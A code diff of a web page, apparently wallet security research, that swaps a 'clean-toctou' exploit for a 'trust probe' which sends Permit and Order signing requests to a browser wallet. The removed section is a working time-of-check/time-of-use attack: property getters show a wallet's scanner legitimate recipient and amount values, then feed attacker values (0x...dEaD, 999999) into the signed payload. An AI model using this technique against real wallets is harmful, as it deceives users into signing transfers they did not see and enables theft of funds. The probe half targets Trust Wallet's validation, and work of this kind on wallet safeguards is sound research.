@@ -3,218 +3,313 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>clean-toctou · tokdie.github.io</title>
+<title>trust probe — permit/order</title>
 <style>
   :root { --bg:#0e1116; --panel:#161b22; --line:#2b3138; --txt:#c9d1d9;
           --ok:#3fb950; --warn:#d29922; --bad:#f85149; --dim:#7d8590; }
   * { box-sizing:border-box; }
   body { margin:0; font:12px/1.45 ui-monospace,Menlo,Consolas,monospace;
          background:var(--bg); color:var(--txt); }
+  .wrap { display:grid; grid-template-columns:1fr; gap:10px; padding:10px;
+          max-width:900px; margin:0 auto; }
+  .panel { background:var(--panel); border:1px solid var(--line);
+           border-radius:6px; padding:10px; }
   h2 { font-size:12px; margin:0 0 8px; color:var(--dim);
        text-transform:uppercase; letter-spacing:.08em; }
-  .wrap { max-width:900px; margin:0 auto; padding:12px; display:grid; gap:10px; }
-  .panel { background:var(--panel); border:1px solid var(--line);
-           border-radius:6px; padding:12px; }
+  h3 { font-size:11px; margin:10px 0 4px; color:#58a6ff;
+       text-transform:uppercase; letter-spacing:.06em; }
   button { background:#21262d; color:var(--txt); border:1px solid var(--line);
-           border-radius:4px; padding:6px 12px; font:inherit; cursor:pointer; margin:3px; }
+           border-radius:4px; padding:6px 12px; font:inherit; cursor:pointer;
+           margin:2px; }
   button:hover { border-color:var(--dim); }
-  button.primary { border-color:var(--ok); color:var(--ok); }
-  button.control { border-color:var(--warn); color:var(--warn); }
+  button.danger { border-color:var(--bad); color:var(--bad); }
+  button.warn { border-color:var(--warn); color:var(--warn); }
+  button:disabled { opacity:.4; cursor:not-allowed; }
   pre { background:#0a0d12; border:1px solid var(--line); border-radius:4px;
-        padding:8px; max-height:340px; overflow:auto; white-space:pre-wrap;
-        word-break:break-all; font-size:11px; margin:4px 0; }
-  .kv { display:grid; grid-template-columns:130px 1fr; gap:2px 8px; }
+        padding:6px; margin:4px 0; max-height:280px; overflow:auto;
+        white-space:pre-wrap; word-break:break-all; font-size:11px; }
+  .kv { display:grid; grid-template-columns:130px 1fr; gap:1px 8px; }
   .kv b { color:var(--dim); font-weight:400; }
-  .row { display:flex; gap:4px; flex-wrap:wrap; margin:4px 0; }
+  .row { display:flex; gap:6px; flex-wrap:wrap; margin:4px 0; }
 </style>
 </head>
 <body>
+
 <div class="wrap">
 
   <div class="panel">
-    <h2>env</h2>
+    <h2>environment</h2>
     <div class="kv" id="env"></div>
   </div>
 
   <div class="panel">
-    <h2>control — plain payload (no getter)</h2>
-    <p style="color:var(--dim);margin:0 0 6px">
-      Если это даёт sig — значит 4001 на getter-payload = внутренний failure, не reject.
+    <h2>probe — plain payloads, no getters</h2>
+    <p style="color:var(--dim);margin:0 0 8px">
+      Каждый payload — чистый объект. Только реальные адреса и стандартные типы.
+      Цель: понять, что именно роняет Trust — нулевой verifyingContract, тип Order, или сканер.
     </p>
-    <button class="control" onclick="runControl()">send plain (no getter)</button>
-    <pre id="control_out">—</pre>
-  </div>
 
-  <div class="panel">
-    <h2>clean-toctou — getter on to/amount only</h2>
-    <p style="color:var(--dim);margin:0 0 6px">
-      Порог = N: чтения 1..N-1 возвращают LEGIT, N+ возвращают ATTACKER.
-      Валидация моста читает #1,#2 (x→M). Сериализация подписи — #3,#4 (stringify@native).
-      Порог 3: сканер видит LEGIT, подпись уйдёт с ATTACKER.
-    </p>
+    <h3>1. personal_sign — контроль моста</h3>
     <div class="row">
-      <button class="primary" onclick="runClean(1)">threshold 1</button>
-      <button class="primary" onclick="runClean(2)">threshold 2</button>
-      <button class="primary" onclick="runClean(3)">threshold 3</button>
-      <button class="primary" onclick="runClean(4)">threshold 4</button>
-      <button class="primary" onclick="runClean(5)">threshold 5</button>
+      <button onclick="p_personal()">personal_sign "hello tokdie"</button>
     </div>
-    <pre id="clean_out">—</pre>
+
+    <h3>2. permit — USDC, реальный контракт</h3>
+    <div class="row">
+      <button onclick="p_permit_usdc()">Permit USDC mainnet</button>
+    </div>
+
+    <h3>3. order — реальный контракт вместо 0x0</h3>
+    <div class="row">
+      <button onclick="p_order_real()">Order · verifyingContract USDC</button>
+      <button class="warn" onclick="p_order_zero()">Order · verifyingContract 0x0 (старый)</button>
+    </div>
+
+    <h3>4. control — plain object, старый payload</h3>
+    <div class="row">
+      <button class="danger" onclick="p_control()">control plain (был 4001)</button>
+    </div>
+
+    <pre id="out">—</pre>
   </div>
 
   <div class="panel">
-    <h2>reads trace</h2>
-    <pre id="trace_out">—</pre>
+    <h2>event log</h2>
+    <div class="row">
+      <button onclick="clearLog()">clear</button>
+      <button onclick="dumpLog()">dump</button>
+    </div>
+    <pre id="log_out">—</pre>
   </div>
 
 </div>
 
 <script>
-/* ───────── config ───────── */
 const ORIGIN = location.origin;
 const IS_REAL = !!window.ethereum;
-const LEGIT_TO = '0x0000000000000000000000000000000000000000';
-const EVIL_TO  = '0x000000000000000000000000000000000000dEaD';
-const LEGIT_AMT = '100';
-const EVIL_AMT  = '999999';
 
-let FROM = null;
+const USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
+const FROM_FALLBACK = '0x20eB588526dac042F39D60A46dC0E7FbB5203945';
 
-const out = (id, s) => {
-  const el = document.getElementById(id);
-  el.textContent = typeof s === 'string' ? s : JSON.stringify(s, null, 2);
-};
-
-const append = (id, s) => {
-  const el = document.getElementById(id);
-  el.textContent = (el.textContent === '—' ? '' : el.textContent) + s + '\n';
+const log = (k, m, d) => {
+  const el = document.getElementById('log_out');
+  const line = `[${new Date().toISOString().slice(11,23)}] ${k.padEnd(9)} ${m}`;
+  const body = d !== undefined
+    ? '\n  ' + JSON.stringify(d, null, 2).split('\n').join('\n  ')
+    : '';
+  el.textContent = (el.textContent === '—' ? '' : el.textContent) + line + body + '\n';
   el.scrollTop = el.scrollHeight;
 };
 
-const trace = (msg, data) => {
-  const line = `[${new Date().toISOString().slice(11,23)}] ${msg}`;
-  const body = data !== undefined ? '\n  ' + JSON.stringify(data, null, 2).split('\n').join('\n  ') : '';
-  append('trace_out', line + body);
+const out = (s) => {
+  document.getElementById('out').textContent =
+    typeof s === 'string' ? s : JSON.stringify(s, null, 2);
 };
 
-/* ───────── env ───────── */
-async function renderEnv() {
-  const el = document.getElementById('env');
-  const kv = (k, v) => `<b>${k}</b><span>${v}</span>`;
-  let html = kv('origin', ORIGIN) + kv('ethereum', IS_REAL ? 'present' : 'absent');
-  if (IS_REAL) {
-    try {
-      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-      FROM = accounts[0] || null;
-      const chain = await window.ethereum.request({ method: 'eth_chainId' });
-      html += kv('from', FROM || '—') + kv('chainId', chain + ' (' + parseInt(chain,16) + ')');
-    } catch (e) {
-      html += kv('bridge error', e.message || String(e));
-    }
-  }
-  el.innerHTML = html;
+const clearLog = () => { document.getElementById('log_out').textContent = '—'; };
+const dumpLog = () => {
+  const t = document.getElementById('log_out').textContent;
+  navigator.clipboard && navigator.clipboard.writeText(t);
+  log('DUMP', 'copied', { len: t.length });
+};
+
+async function account() {
+  if (!window.ethereum) throw new Error('no ethereum');
+  const a = await window.ethereum.request({ method: 'eth_requestAccounts' });
+  return a[0];
 }
 
-/* ───────── base payload ───────── */
-function baseTyped() {
-  return {
+async function send(method, params, tag) {
+  log('REQ', tag, { method, paramsSummary: summarize(params) });
+  const t0 = performance.now();
+  try {
+    const r = await window.ethereum.request({ method, params });
+    const ms = Math.round(performance.now() - t0);
+    log('OK', tag, { ms, sig: typeof r === 'string' ? r.slice(0, 42) + '…' : r });
+    out(`OK ${tag}\n${ms}ms\nsig: ${r}`);
+    return { ok: true, sig: r, ms };
+  } catch (e) {
+    const ms = Math.round(performance.now() - t0);
+    log('ERR', tag, {
+      ms,
+      code: e && e.code,
+      message: e && e.message,
+      raw: String(e),
+      keys: e && typeof e === 'object' ? Object.keys(e) : null,
+    });
+    out(`ERR ${tag}\n${ms}ms\ncode: ${e && e.code}\nmessage: ${e && e.message}\nraw: ${String(e)}`);
+    return { ok: false, err: e, ms };
+  }
+}
+
+function summarize(p) {
+  if (!p) return null;
+  if (typeof p === 'string') return { type: 'string', len: p.length };
+  if (Array.isArray(p)) return { type: 'array', len: p.length };
+  return { type: 'object', keys: Object.keys(p) };
+}
+
+/* ─────────────  payloads  ───────────── */
+
+function payloadPersonal() {
+  return { method: 'personal_sign', params: ['hello tokdie', FROM_FALLBACK] };
+}
+
+function payloadPermitUSDC(from) {
+  // EIP-2612 Permit для USDC mainnet — стандартный тип, поддерживается сканером
+  const typed = {
     domain: {
-      name: 'Tokdie', version: '1', chainId: 1,
-      verifyingContract: '0x0000000000000000000000000000000000000000',
+      name: 'USD Coin',
+      version: '2',
+      chainId: 1,
+      verifyingContract: USDC,
+    },
+    types: {
+      Permit: [
+        { name: 'owner', type: 'address' },
+        { name: 'spender', type: 'address' },
+        { name: 'value', type: 'uint256' },
+        { name: 'nonce', type: 'uint256' },
+        { name: 'deadline', type: 'uint256' },
+      ],
+    },
+    primaryType: 'Permit',
+    message: {
+      owner: from,
+      spender: '0x000000000000000000000000000000000000dEaD',
+      value: '1000000',
+      nonce: '0',
+      deadline: '9999999999',
+    },
+  };
+  return { method: 'eth_signTypedData_v4', params: [from, JSON.stringify(typed)], _typed: typed };
+}
+
+function payloadOrderReal(from) {
+  const typed = {
+    domain: {
+      name: 'Tokdie',
+      version: '1',
+      chainId: 1,
+      verifyingContract: USDC, // реальный контракт
     },
     types: {
       Order: [
-        { name: 'to',     type: 'address' },
+        { name: 'to', type: 'address' },
         { name: 'amount', type: 'uint256' },
       ],
     },
     primaryType: 'Order',
+    message: {
+      to: '0x0000000000000000000000000000000000000000',
+      amount: '100',
+    },
   };
+  return { method: 'eth_signTypedData_v4', params: [from, JSON.stringify(typed)], _typed: typed };
 }
 
-/* ───────── control — plain payload ───────── */
-async function runControl() {
-  out('control_out', 'sending plain payload...');
-  trace('CONTROL send', { method: 'eth_signTypedData_v4' });
-  if (!IS_REAL) return out('control_out', 'no ethereum');
+function payloadOrderZero(from) {
+  const typed = {
+    domain: {
+      name: 'Tokdie',
+      version: '1',
+      chainId: 1,
+      verifyingContract: '0x0000000000000000000000000000000000000000',
+    },
+    types: {
+      Order: [
+        { name: 'to', type: 'address' },
+        { name: 'amount', type: 'uint256' },
+      ],
+    },
+    primaryType: 'Order',
+    message: {
+      to: '0x0000000000000000000000000000000000000000',
+      amount: '100',
+    },
+  };
+  return { method: 'eth_signTypedData_v4', params: [from, JSON.stringify(typed)], _typed: typed };
+}
+
+/* ─────────────  probes  ───────────── */
+
+async function p_personal() {
   try {
-    if (!FROM) FROM = (await window.ethereum.request({ method: 'eth_requestAccounts' }))[0];
-    const typed = baseTyped();
-    typed.message = { to: LEGIT_TO, amount: LEGIT_AMT };
-    const sig = await window.ethereum.request({
-      method: 'eth_signTypedData_v4',
-      params: [FROM, JSON.stringify(typed)],
-    });
-    trace('CONTROL ok', { sig });
-    out('control_out', 'sig:\n' + sig);
-  } catch (e) {
-    trace('CONTROL err', { code: e.code, message: e.message, raw: String(e) });
-    out('control_out', JSON.stringify({ code: e.code, message: e.message, raw: String(e) }, null, 2));
+    const from = await account();
+    const p = payloadPersonal();
+    log('ENV', 'personal_sign', { from });
+    await send(p.method, p.params, 'personal');
+  } catch (e) { log('ERR', 'personal · setup', { message: e.message }); }
+}
+
+async function p_permit_usdc() {
+  try {
+    const from = await account();
+    const p = payloadPermitUSDC(from);
+    log('ENV', 'permit_usdc', { from, contract: USDC });
+    out('sending Permit USDC…\n' + JSON.stringify(p._typed, null, 2));
+    await send(p.method, p.params, 'permit-usdc');
+  } catch (e) { log('ERR', 'permit · setup', { message: e.message }); }
+}
+
+async function p_order_real() {
+  try {
+    const from = await account();
+    const p = payloadOrderReal(from);
+    log('ENV', 'order_real', { from, contract: USDC });
+    out('sending Order (real contract)…\n' + JSON.stringify(p._typed, null, 2));
+    await send(p.method, p.params, 'order-real');
+  } catch (e) { log('ERR', 'order-real · setup', { message: e.message }); }
+}
+
+async function p_order_zero() {
+  try {
+    const from = await account();
+    const p = payloadOrderZero(from);
+    log('ENV', 'order_zero', { from, contract: '0x0' });
+    out('sending Order (zero contract)…\n' + JSON.stringify(p._typed, null, 2));
+    await send(p.method, p.params, 'order-zero');
+  } catch (e) { log('ERR', 'order-zero · setup', { message: e.message }); }
+}
+
+async function p_control() {
+  try {
+    const from = await account();
+    // тот же plain payload, что давал 4001
+    const typed = {
+      domain: { name: 'Tokdie', version: '1', chainId: 1, verifyingContract: '0x0000000000000000000000000000000000000000' },
+      types: { Order: [{ name: 'to', type: 'address' }, { name: 'amount', type: 'uint256' }] },
+      primaryType: 'Order',
+      message: { to: '0x0000000000000000000000000000000000000000', amount: '100' },
+    };
+    log('ENV', 'control', { from });
+    out('sending control plain…\n' + JSON.stringify(typed, null, 2));
+    await send('eth_signTypedData_v4', [from, JSON.stringify(typed)], 'control');
+  } catch (e) { log('ERR', 'control · setup', { message: e.message }); }
+}
+
+/* ─────────────  env  ───────────── */
+
+function renderEnv() {
+  const eth = window.ethereum || {};
+  document.getElementById('env').innerHTML = `
+    <b>origin</b><span>${ORIGIN}</span>
+    <b>ethereum</b><span>${IS_REAL ? 'present' : 'absent'}</span>
+    <b>isTrust</b><span>${eth.isTrust ? 'yes' : 'no'}</span>
+    <b>isMetaMask</b><span>${eth.isMetaMask ? 'yes' : 'no'}</span>
+    <b>isCoinbase</b><span>${eth.isCoinbaseWallet ? 'yes' : 'no'}</span>
+    <b>UA</b><span style="font-size:10px">${navigator.userAgent}</span>
+    <b>chainId</b><span id="env_chain">—</span>
+  `;
+  if (IS_REAL) {
+    eth.request({ method: 'eth_chainId' })
+      .then(id => { document.getElementById('env_chain').textContent = id + ' (' + parseInt(id, 16) + ')'; })
+      .catch(() => {});
   }
 }
 
-/* ───────── clean-toctou — getter on to/amount ───────── */
-async function runClean(threshold) {
-  out('clean_out', `sending getter payload · threshold=${threshold}...`);
-  trace('CLEAN send', { method: 'eth_signTypedData_v4', threshold });
-
-  if (!IS_REAL) return out('clean_out', 'no ethereum');
-  if (!FROM) FROM = (await window.ethereum.request({ method: 'eth_requestAccounts' }))[0];
-
-  // счётчик в замыкании — не в объекте
-  let reads = 0;
-  const typed = baseTyped();
-  const msg = {};
-  Object.defineProperty(msg, 'to', {
-    enumerable: true,
-    get() {
-      reads++;
-      const isEvil = reads >= threshold;
-      const value = isEvil ? EVIL_TO : LEGIT_TO;
-      const stack = new Error().stack || '';
-      trace(`READ #${reads} · to · ${isEvil ? 'EVIL' : 'LEGIT'}`, {
-        value, stack,
-      });
-      return value;
-    },
-  });
-  Object.defineProperty(msg, 'amount', {
-    enumerable: true,
-    get() {
-      reads++;
-      const isEvil = reads >= threshold;
-      const value = isEvil ? EVIL_AMT : LEGIT_AMT;
-      const stack = new Error().stack || '';
-      trace(`READ #${reads} · amount · ${isEvil ? 'EVIL' : 'LEGIT'}`, {
-        value, stack,
-      });
-      return value;
-    },
-  });
-  typed.message = msg;
-
-  const summary = { threshold, reads_before: reads, reads_after: 0, sig: null, err: null };
-
-  try {
-    const sig = await window.ethereum.request({
-      method: 'eth_signTypedData_v4',
-      params: [FROM, typed],  // объект, не строка
-    });
-    summary.reads_after = reads;
-    summary.sig = sig;
-    trace('CLEAN ok', summary);
-    out('clean_out', 'SIG:\n' + sig + '\n\nreads total: ' + reads);
-  } catch (e) {
-    summary.reads_after = reads;
-    summary.err = { code: e.code, message: e.message, raw: String(e) };
-    trace('CLEAN err', summary);
-    out('clean_out', JSON.stringify(summary, null, 2));
-  }
-}
-
-/* ───────── boot ───────── */
-trace('BOOT', { origin: ORIGIN, real: IS_REAL });
 renderEnv();
+log('BOOT', 'trust probe up', { origin: ORIGIN, real: IS_REAL });
 </script>
 </body>
 </html>
